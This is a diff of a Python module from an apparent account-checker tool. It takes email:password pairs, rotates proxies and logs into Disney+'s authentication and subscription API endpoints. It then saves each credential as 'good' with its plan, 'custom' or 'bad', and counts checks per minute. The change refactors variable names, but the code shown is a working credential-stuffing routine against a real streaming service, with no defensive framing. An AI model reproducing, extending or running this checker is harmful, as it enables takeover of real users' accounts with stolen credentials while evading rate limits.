@@ -1,4 +1,4 @@
-from __main__ import checker
+from modules.variables import Checker
 from modules.functions import set_proxy,log,save,bad_proxy
 from requests import get,post
 from random import choices
@@ -8,8 +8,10 @@ from json import loads
 
 def check(email:str,password:str):
     retries = 0
-    while retries != checker.retries:
+    while retries != Checker.retries:
         proxy = set_proxy()
+        proxy_set = set_proxy(proxy)
+
         header_1 = {  
             "content-type":"application/json",
             "Accept": "application/json" ,
@@ -69,24 +71,24 @@ def check(email:str,password:str):
         header_3["X-BAMSDK-Transaction-ID"] = pid
         
         try:
-            r = post("https://disney.api.edge.bamgrid.com/graph/v1/device/graphql",headers=header_1,json=data_1,proxies=set_proxy(proxy),timeout=checker.timeout).json()
+            r = post("https://disney.api.edge.bamgrid.com/graph/v1/device/graphql",headers=header_1,json=data_1,proxies=proxy_set,timeout=Checker.timeout).json()
             token = r["extensions"]["sdk"]["token"]["accessToken"]
             header_2["Authorization"] = token
 
-            r = post("https://disney.api.edge.bamgrid.com/v1/public/graphql",json=data_2,headers=header_2,proxies=set_proxy(proxy),timeout=checker.timeout)
+            r = post("https://disney.api.edge.bamgrid.com/v1/public/graphql",json=data_2,headers=header_2,proxies=proxy_set,timeout=Checker.timeout)
             if "data\":null" in r.text:
                 retries += 1
             elif "accessToken" in r.text:
                 token = r.text.split('"accessToken\":"')[1].split("\",")[0]
                 header_3["Authorization"] = token
 
-                r = get("https://disney.api.edge.bamgrid.com/subscriptions",headers=header_3,proxies=set_proxy(proxy),timeout=checker.timeout)
+                r = get("https://disney.api.edge.bamgrid.com/subscriptions",headers=header_3,proxies=proxy_set,timeout=Checker.timeout)
                 if "type\":\"UNSUBSCRIBED" in r.text or r.text == "[]":
-                    if not checker.cui:
+                    if not Checker.cui:
                         log("custom",email+":"+password,"Disney")
-                    save("Disney","custom",checker.time,email+":"+password)
-                    checker.custom += 1
-                    checker.cpm += 1
+                    save("Disney","custom",Checker.time,email+":"+password)
+                    Checker.custom += 1
+                    Checker.cpm += 1
                     return
                 elif "expirationDate" in r.text:
                     expire = r.text.split("\"expirationDate\":\"")[1].split("T")[0]
@@ -96,18 +98,18 @@ def check(email:str,password:str):
                     exp = int(expire.replace("-",""))
 
                     if exp > now:
-                        if not checker.cui:
+                        if not Checker.cui:
                             log("good",email+":"+password,"Disney")
-                        save("Disney","good",checker.time,email+":"+password+f" Plan: {plan}")
-                        checker.good += 1
-                        checker.cpm += 1
+                        save("Disney","good",Checker.time,email+":"+password+f" Plan: {plan}")
+                        Checker.good += 1
+                        Checker.cpm += 1
                         return
                     else:
-                        if not checker.cui:
+                        if not Checker.cui:
                             log("custom",email+":"+password,"Disney")
-                        save("Disney","custom",checker.time,email+":"+password)
-                        checker.custom += 1
-                        checker.cpm += 1
+                        save("Disney","custom",Checker.time,email+":"+password)
+                        Checker.custom += 1
+                        Checker.cpm += 1
                         return
                 else:
                     raise
@@ -115,9 +117,9 @@ def check(email:str,password:str):
                 raise
         except:
             bad_proxy(proxy)
-            checker.errors += 1
-    if not checker.cui:
+            Checker.errors += 1
+    if not Checker.cui:
         log("bad",email+":"+password,"Disney")
-    checker.bad += 1
-    checker.cpm += 1
+    Checker.bad += 1
+    Checker.cpm += 1
     return
